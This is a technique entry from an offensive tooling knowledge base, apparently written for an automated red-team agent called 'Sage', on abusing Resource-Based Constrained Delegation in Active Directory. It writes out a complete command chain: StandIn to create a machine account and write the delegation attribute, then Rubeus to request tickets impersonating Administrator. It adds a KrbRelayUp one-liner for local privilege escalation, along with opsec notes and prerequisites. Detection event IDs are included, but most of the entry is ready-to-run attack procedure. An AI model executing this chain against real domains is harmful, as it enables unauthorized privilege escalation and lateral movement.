---
name: Resource-Based Constrained Delegation Abuse
category: delegation-abuse
subcategories: [rbcd, s4u2self, s4u2proxy, lateral-movement]
tradecraft_tags: [rbcd, delegation, s4u, kerberos, computer-account, acl-abuse, technique]
mitre_attack:
  - id: T1558
    name: Steal or Forge Kerberos Tickets
source:
  url: https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  RBCD setup: Event 5136 (msDS-AllowedToActOnBehalfOfOtherIdentity write) + Event 4741
  (machine account creation). Exploitation: S4U2self + S4U2proxy Kerberos ticket sequence
  is unusual — KDC logs show S4U requests from a machine account to impersonate a user
  to a service. MDI has S4U abuse detection. The combination of events in a tight window
  is a strong RBCD attack signature.
usage_examples:
  - description: Full RBCD chain — setup (StandIn) + exploit (Rubeus)
    args: "# 1. Create machine account:\nStandIn.exe --computer mypc01 --password 'P@ssw0rd1!'\n# 2. Write RBCD:\nStandIn.exe --rbcd --computer mypc01 --target VICTIM$\n# 3. Get TGT for machine account:\nRubeus.exe asktgt /user:mypc01$ /password:'P@ssw0rd1!' /domain:north.sevenkingdoms.local /nowrap\n# 4. S4U chain:\nRubeus.exe s4u /ticket:<TGT> /impersonateuser:Administrator /msdsspn:cifs/VICTIM.north.sevenkingdoms.local /ptt"
opsec_notes: |
  This is a TECHNIQUE SUMMARY that ties together StandIn (RBCD setup) and Rubeus (S4U
  exploitation). The individual OPSEC notes are in standin.md and rubeus.md. The combined
  RBCD attack generates multiple high-signal events. For local RBCD (same machine), use
  KrbRelayUp / SharpKrbRelay which avoid the machine account creation step and external
  LDAP write by using Kerberos relay.
gotchas: |
  Machine account quota (ms-DS-MachineAccountQuota, default 10) must be > 0. The
  exploiting machine account (mypc01$) needs an SPN for S4U2self — newly created machine
  accounts auto-generate HOST and restrictedkerberos SPNs. The S4U2proxy target SPN must
  be accessible from the domain (verify CIFS/SMB is accessible on VICTIM). RBCD requires
  Windows Server 2012 R2+ functional level.
related_ttps: [standin, rubeus, krbrelay, sharpkrbrelay, krbrelayup, whisker]
alternatives: [krbrelayup-auto, krbrelay-auto, whisker-shadow-cred-path]
common_args: {}
last_updated: 2026-05-29
---

# Resource-Based Constrained Delegation Abuse

A technique summary for the complete RBCD (Resource-Based Constrained Delegation) attack
chain. RBCD is a delegation configuration that allows an account (the "front-end service")
to impersonate any user when accessing a specific resource. When an attacker can write to
the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of a computer object, they can
create or designate an account as the front-end service and then use S4U2self + S4U2proxy
to obtain service tickets impersonating any domain user to that computer.

## The RBCD Attack Chain

```
Prerequisite: Write rights on msDS-AllowedToActOnBehalfOfOtherIdentity on VICTIM$
              (from GenericWrite, GenericAll, WriteDACL, or RBCD-write ACE)

1. Create attacker-controlled machine account: StandIn --computer mypc01 --password X
2. Write RBCD: StandIn --rbcd --computer mypc01 --target VICTIM$
3. Request TGT for mypc01$: Rubeus asktgt /user:mypc01$ /password:X
4. S4U chain: Rubeus s4u /ticket:<TGT> /impersonateuser:Administrator
             /msdsspn:cifs/VICTIM.DOMAIN /ptt
5. Access VICTIM as Administrator
```

## Local RBCD (no external LDAP write)

For local privilege escalation on the compromised machine itself, KrbRelayUp / SharpKrbRelay
automate the entire chain including the LDAP write via Kerberos relay (no need for external
LDAP write permission on a different computer object):

```
KrbRelayUp.exe full -m rbcd --auto
```

## Typical use cases
- Lateral movement from GenericWrite/GenericAll on a computer object → SYSTEM on that machine
- Local privilege escalation (KrbRelayUp/SharpKrbRelay variant)
- Domain-level escalation when a controlled principal has RBCD write rights

## How Sage uses this
Sage identifies RBCD opportunities from SharpHound BloodHound data (GenericWrite edges
to computer objects) and from KrbRelayUp for local escalation. The chain uses StandIn
for RBCD setup and Rubeus for S4U exploitation, or KrbRelayUp for the automated local path.
